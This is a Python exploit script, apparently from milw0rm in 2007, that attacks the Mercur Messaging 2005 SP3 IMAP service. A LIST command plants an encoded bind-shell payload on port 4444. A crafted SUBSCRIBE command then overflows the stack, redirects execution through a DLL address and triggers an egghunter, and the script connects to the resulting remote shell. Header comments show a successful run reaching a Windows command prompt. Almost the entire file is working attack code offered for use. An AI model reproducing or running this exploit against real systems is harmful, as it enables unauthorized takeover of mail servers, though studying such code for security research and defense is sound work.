#!/usr/bin/python
# 
# Mercur Messaging 2005 SP3 IMAP service - Egghunter mod
# muts@offensive-security.com
# http://www.offensive-security.com
# Original exploit by Winny Thomas
# Thanks Thomas, this code really came in handy !
# VMWare seems to alter the stack a bit as the offset 
# of the EIP overwrite was a few bytes off (Windows XPsp2).
# You can inject more than 2000 bytes using an IMAP command (I chose LIST), 
# and then let the egghunter do the rest of the work.
# The initial injected buffer gets cut off, so you need to double check that.
# 
# bt ~ # ./imap.py 192.168.0.75 test test
# * OK MERCUR IMAP4-Server (v5.00.14 Unregistered) for Windows ready at Thu, 22 Mar 2007 00:59:19 +0200
# a001 OK LOGIN completed
# BAD Command unknown
# Shell on port 4444
# 
# bt ~ # nc -v 192.168.0.75 4444
# 192.168.0.75: inverse host lookup failed: Unknown host
# (UNKNOWN) [192.168.0.75] 4444 (krb524) open
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
# 
# C:\WINDOWS\system32>

 

import os
import sys
import time
import socket
import struct

# Place our w00tw00t egghunter in nop heaven

shellcode = "\x90" * 92 
shellcode +="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode +="\x90" * 100
 
# Place w00t and bindshell in correct place in LIST command.

bindshell = "\x90" * 320
bindshell +="\x54\x30\x30\x57\x54\x30\x30\x57" 

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
bindshell +=("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4f\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x58"
"\x4e\x56\x46\x32\x46\x32\x4b\x38\x45\x44\x4e\x43\x4b\x58\x4e\x47"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x38\x4f\x34\x4a\x41\x4b\x58"
"\x4f\x55\x42\x52\x41\x30\x4b\x4e\x43\x4e\x42\x53\x49\x54\x4b\x38"
"\x46\x53\x4b\x58\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a"
"\x46\x58\x42\x4c\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x30"
"\x44\x4c\x4b\x4e\x46\x4f\x4b\x33\x46\x55\x46\x42\x4a\x42\x45\x57"
"\x43\x4e\x4b\x58\x4f\x55\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58"
"\x4e\x50\x4b\x34\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x43\x30"
"\x4e\x52\x4b\x48\x49\x38\x4e\x36\x46\x42\x4e\x41\x41\x56\x43\x4c"
"\x41\x43\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x33\x4b\x58\x42\x44"
"\x4e\x50\x4b\x38\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x54\x4a\x50"
"\x50\x35\x4a\x46\x50\x58\x50\x44\x50\x50\x4e\x4e\x42\x35\x4f\x4f"
"\x48\x4d\x41\x53\x4b\x4d\x48\x36\x43\x55\x48\x56\x4a\x36\x43\x33"
"\x44\x33\x4a\x56\x47\x47\x43\x47\x44\x33\x4f\x55\x46\x55\x4f\x4f"
"\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e\x4e\x4f\x4b\x53\x42\x45\x4f\x4f"
"\x48\x4d\x4f\x35\x49\x48\x45\x4e\x48\x56\x41\x48\x4d\x4e\x4a\x50"
"\x44\x30\x45\x55\x4c\x46\x44\x50\x4f\x4f\x42\x4d\x4a\x36\x49\x4d"
"\x49\x50\x45\x4f\x4d\x4a\x47\x55\x4f\x4f\x48\x4d\x43\x45\x43\x45"
"\x43\x55\x43\x55\x43\x45\x43\x34\x43\x45\x43\x34\x43\x35\x4f\x4f"
"\x42\x4d\x48\x56\x4a\x56\x41\x41\x4e\x35\x48\x36\x43\x35\x49\x38"
"\x41\x4e\x45\x49\x4a\x46\x46\x4a\x4c\x51\x42\x57\x47\x4c\x47\x55"
"\x4f\x4f\x48\x4d\x4c\x36\x42\x31\x41\x45\x45\x35\x4f\x4f\x42\x4d"
"\x4a\x36\x46\x4a\x4d\x4a\x50\x42\x49\x4e\x47\x55\x4f\x4f\x48\x4d"
"\x43\x35\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x45\x4e\x49\x44\x48\x38"
"\x49\x54\x47\x55\x4f\x4f\x48\x4d\x42\x55\x46\x35\x46\x45\x45\x35"
"\x4f\x4f\x42\x4d\x43\x49\x4a\x56\x47\x4e\x49\x37\x48\x4c\x49\x37"
"\x47\x45\x4f\x4f\x48\x4d\x45\x55\x4f\x4f\x42\x4d\x48\x36\x4c\x56"
"\x46\x46\x48\x36\x4a\x46\x43\x56\x4d\x56\x49\x38\x45\x4e\x4c\x56"
"\x42\x55\x49\x55\x49\x52\x4e\x4c\x49\x48\x47\x4e\x4c\x36\x46\x54"
"\x49\x58\x44\x4e\x41\x43\x42\x4c\x43\x4f\x4c\x4a\x50\x4f\x44\x54"
"\x4d\x32\x50\x4f\x44\x54\x4e\x52\x43\x49\x4d\x58\x4c\x47\x4a\x53"
"\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x46\x44\x57\x50\x4f\x43\x4b\x48\x51"
"\x4f\x4f\x45\x57\x46\x54\x4f\x4f\x48\x4d\x4b\x45\x47\x35\x44\x35"
"\x41\x35\x41\x55\x41\x35\x4c\x46\x41\x50\x41\x35\x41\x45\x45\x35"
"\x41\x45\x4f\x4f\x42\x4d\x4a\x56\x4d\x4a\x49\x4d\x45\x30\x50\x4c"
"\x43\x35\x4f\x4f\x48\x4d\x4c\x56\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f"
"\x42\x4d\x4b\x58\x47\x45\x4e\x4f\x43\x38\x46\x4c\x46\x36\x4f\x4f"
"\x48\x4d\x44\x55\x4f\x4f\x42\x4d\x4a\x36\x4f\x4e\x50\x4c\x42\x4e"
"\x42\x36\x43\x55\x4f\x4f\x48\x4d\x4f\x4f\x42\x4d\x5a")

# Pad the injected command

bindshell +="\xcc" * 1000

def ExploitMercur(target, username, passwd):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((target, 143))
	response = sock.recv(1024)
	print response
	login = 'a001 LOGIN ' + username + ' ' + passwd + '\r\n'
	sock.send(login)
	response = sock.recv(1024)
	print response
	imaplist = 'a001 LIST ' + bindshell + '\r\n'
	sock.send(imaplist)
	response = sock.recv(1024)
	print response
	payload = shellcode
	payload += 'L' * 1
	payload += 'Y' * 4
	payload += 'Z' * 4
#	01883A50	FFD3	CALL EBX	MCRFAX.DLL
	payload += struct.pack('<L', 0x01883A50)
	payload += 'L' *  27
	payload += 'M' *  16
	payload += ' ' + '\"/\"' + ' ' + '\"\"'
	req = 'a001 SUBSCRIBE ' + payload + '\r\n'
	sock.send(req)
	sock.close()
	print 'Shell on port 4444'

def ConnectRemoteShell(target):
	connect = "/usr/bin/telnet " + target + " 4444"
	os.system(connect)

if __name__=="__main__":
	try:
		target = sys.argv[1]
		username = sys.argv[2]
		passwd = sys.argv[3]
	except IndexError:
		print 'Usage: %s <imap server> <username> <password>\n' % sys.argv[0]
		sys.exit(-1)
	ExploitMercur(target, username, passwd)

# milw0rm.com [2007-03-21]